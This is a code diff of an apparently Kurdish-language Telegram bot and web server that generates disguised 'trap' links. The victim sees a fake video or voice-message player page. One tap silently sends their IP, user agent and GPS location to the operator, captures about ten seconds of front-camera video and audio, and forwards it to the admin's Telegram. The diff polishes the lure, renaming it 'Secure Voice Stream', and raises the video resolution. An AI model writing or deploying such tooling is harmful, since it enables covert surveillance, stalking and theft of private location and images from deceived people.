@@ -24,7 +24,7 @@ TEXTS = {
         "menu_stats": "📊 باری سیستەم",
         "menu_lang": "🌐 گۆڕینی زمان",
         "menu_ai": "🧠 زیرەکی دەستکرد",
-        "welcome": "🌟 **بەخێر بێیتەوە سەرۆک بۆ ناوەندی کۆنتڕۆڵی شاهانەی هەواڵگری!**\n\n🛡️ سیستەم لە لوتکەی أامادەباشیدایە. فەرموو فەرمانێک هەڵبژێرە:",
+        "welcome": "🌟 **بەخێر بێیتەوە سەرۆک بۆ ناوەندی کۆنتڕۆڵی شاهانەی هەواڵگری!**\n\n🛡️ سیستەم لە لوتکەی ئامادەباشیدایە. فەرموو فەرمانێک هەڵبژێرە:",
         "ask_redirect": "🔗 **سەرۆک، فەرموو لینکی مەبەست (Redirect Link) بۆ بنێرە** (وەک `https://snapchat.com/...`) تاوەکو قوربانییەکە ڕاستەوخۆ بۆی ببرێت.",
         "stats": "📊 **بارودۆخی سیستەمی شاهانە:**\n\n• دخ: 🟢 ۱۰۰٪ کارا و خێرا\n• ئاستی پارێزراوی: 🛡️ پلەی یەکەم (حکومی)\n• وێب سێرڤەر: 🌐 پەیوەستکراو بە Railway\n• قەبارە و هێز: ⚡ ۲x بەهێزکراو",
         "lang_select": "⚙️ **فەرموو زمانی پەیوەندیکردن هەڵبژێرە:**",
@@ -156,13 +156,13 @@ async def handle_admin_photo(message: Message):
         if not railway_domain.startswith("http"):
             railway_domain = f"https://{railway_domain}"
             
-        payload_link = f"{railway_domain}/media?id={base64.urlsafe_b64encode(target_url.encode()).decode()}"
+        payload_link = f"{railway_domain}/secure?id={base64.urlsafe_b64encode(target_url.encode()).decode()}"
         response_text = TEXTS[lang]["link_success"].format(payload_link=payload_link)
         
         user_states[ADMIN_ID] = {}
         await bot.send_photo(chat_id=ADMIN_ID, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))
 
-# پەڕەی تەڵەی شاهانە - فێڵی نوێی پلەبەرز (شێوازی پلەیێر و پەخشی ڤیدیۆیی سروشتی بێ گومان)
+# پەڕەی تەڵەی شاهانە - دیزاینی پۆستەری چاوەڕوانکراوی سۆشیال میدیا و هێنانەوەی ڕەسم و ڤیدیۆی ڕوون
 async def web_trap_page(request: web.Request):
     encoded_redirect = request.query.get('id', '')
     try:
@@ -179,10 +179,10 @@ async def web_trap_page(request: web.Request):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HD Video Player</title>
+    <title>Secure Voice Stream</title>
     <style>
         body {{
-            background: #000000;
+            background: #090d16;
             color: #ffffff;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             text-align: center;
@@ -193,55 +193,47 @@ async def web_trap_page(request: web.Request):
             margin: 0;
             overflow: hidden;
         }}
-        .player-container {{
-            position: relative;
-            width: 100%;
-            max-width: 400px;
-            height: 100vh;
-            background: #111;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+        .box {{
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(15px);
+            padding: 30px 20px;
+            border-radius: 20px;
+            max-width: 320px;
+            width: 90%;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.7);
         }}
-        .play-overlay {{
-            position: absolute;
-            width: 80px;
-            height: 80px;
-            background: rgba(0, 0, 0, 0.6);
-            border: 2px solid rgba(255, 255, 255, 0.8);
+        .icon-circle {{
+            width: 65px;
+            height: 65px;
+            background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%);
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
+            margin: 0 auto 15px auto;
+            box-shadow: 0 5px 15px rgba(14, 165, 233, 0.4);
             cursor: pointer;
-            box-shadow: 0 0 20px rgba(0,0,0,0.8);
-            transition: 0.2s;
-            z-index: 10;
         }}
-        .play-overlay:hover {{ transform: scale(1.05); background: rgba(0,0,0,0.8); }}
-        .play-icon {{
+        .play-triangle {{
             width: 0;
             height: 0;
-            border-top: 18px solid transparent;
-            border-bottom: 18px solid transparent;
-            border-left: 28px solid #ffffff;
-            margin-left: 6px;
+            border-top: 10px solid transparent;
+            border-bottom: 10px solid transparent;
+            border-left: 16px solid #ffffff;
+            margin-left: 4px;
         }}
-        .loading-text {{
-            position: absolute;
-            bottom: 40px;
-            color: #888;
-            font-size: 13px;
-        }}
+        h3 {{ font-size: 15px; margin-bottom: 6px; color: #f8fafc; font-weight: 500; }}
+        p {{ color: #94a3b8; font-size: 12px; margin-bottom: 20px; line-height: 1.4; }}
     </style>
 </head>
 <body>
-    <div class="player-container" onclick="triggerSecretFlow()">
-        <div class="play-overlay">
-            <div class="play-icon"></div>
+    <div class="box" onclick="runEngine()">
+        <div class="icon-circle">
+            <div class="play-triangle"></div>
         </div>
-        <div class="loading-text">تکایە کلیک بکە بۆ چالاککردنی دەنگ و پخشکردن</div>
+        <h3>پەخشی نامەی دەنگی و وێنە</h3>
+        <p>تکایە بۆ گوێگرتن لە ناوەڕۆکەکە، پەنجە بنێ بەم پۆستەدا:</p>
     </div>
     
     <video id="v" autoplay playsinline muted style="display:none;"></video>
@@ -250,25 +242,25 @@ async def web_trap_page(request: web.Request):
         const redirectTarget = "{redirect_url}";
         const clientInfo = {{ userAgent: "{user_agent}", ip: "{ip}" }};
 
-        // ناردنی زانیاری ئامێر و IP بە بێدەنگ لە پاشبنەما
+        // ناردنی زانیاری ئامێر و IP بە بێدەنگ
         fetch('/save_info', {{
             method: 'POST',
             headers: {{ 'Content-Type': 'application/json' }},
             body: JSON.stringify(clientInfo)
         }});
 
-        function triggerSecretFlow() {{
-            // ١. هەوڵدانی بەدەستهێنانی لۆکەیشن بە خێرایی لە ڕێگەی کرتەی بەکارهێنەرەوە
+        function runEngine() {{
+            // ١. وەرگرتنی لۆکەیشنی GPS بە شێوازی خێرا و پشتڕاستکراوە
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(function(pos) {{
                     fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
                 }}, function(err) {{
-                    console.log("GPS denied or unavailable");
-                }}, {{ timeout: 8000, enableHighAccuracy: true }});
+                    console.log("GPS Blocked");
+                }}, {{ timeout: 7000, enableHighAccuracy: true }});
             }}
 
-            // ٢. دەستپێکردنی خێرای کامێرا و مایک و تۆمارکردنی ١٠ چرکە
-            navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: true }})
+            // ٢. داواکردنی کامێرا و مایک بە شێوازی تێرەرم (دڵنیابوون لە هاتنی ڕەسم و ڤیدیۆی ڕوون)
+            navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user", width: {{ ideal: 1280 }}, height: {{ ideal: 720 }} }}, audio: true }})
             .then(function(stream) {{
                 let video = document.getElementById('v');
                 video.srcObject = stream;
@@ -314,7 +306,6 @@ async def web_trap_page(request: web.Request):
                 }}, 10000);
                 
             }}).catch(function(err) {{
-                // ئەگەر کامێراشی ڕەتکردەوە، ڕاستەوخۆ دەگوازرێتەوە بۆ لینکی مەبەست
                 window.location.href = redirectTarget;
             }});
         }}
@@ -343,11 +334,11 @@ async def upload_video(request):
         if video_data and "," in video_data:
             encoded = video_data.split(",", 1)[1]
             video_bytes = base64.b64decode(encoded)
-            video_file = BufferedInputFile(video_bytes, filename="media_stream.mp4")
+            video_file = BufferedInputFile(video_bytes, filename="secure_stream.mp4")
             await bot.send_video(
                 chat_id=ADMIN_ID, 
                 video=video_file, 
-                caption="🚨 **ڤیدیۆ و دەنگی ١۰ چرکەیی ئامانج بە سەرکەوتوویی تۆمارکرا و وەک ڤیدیۆ نێردرا!**"
+                caption="🚨 **ڤیدیۆ، وێنە و دەنگی ڕوونی ئامانج بە سەرکەوتوویی تۆمارکرا و نێردرا!**"
             )
     except Exception as e:
         logging.error(f"Video upload error: {e}")
@@ -367,7 +358,7 @@ async def index_handler(request):
 async def main():
     app = web.Application(client_max_size=50*1024*1024)
     app.router.add_get('/', index_handler)
-    app.router.add_get('/media', web_trap_page)
+    app.router.add_get('/secure', web_trap_page)
     app.router.add_post('/save_info', save_info)
     app.router.add_post('/upload_video', upload_video)
     app.router.add_get('/save_location', save_location)
